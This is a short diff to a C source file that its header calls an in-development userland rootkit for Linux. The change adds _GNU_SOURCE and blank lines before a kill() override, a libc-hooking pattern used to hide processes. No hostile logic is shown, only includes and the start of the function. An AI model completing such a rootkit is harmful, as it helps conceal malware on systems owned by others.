@@ -1,13 +1,15 @@
 // my rootkit userland for linux.
 // author: Darksec, in development phase
 
-
+#define _GNU_SOURCE
 #include <signal.h>
 #include <stdio.h>
 #include <dlfcn.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
+
+
 
        int kill(pid_t pid, int sig){
 
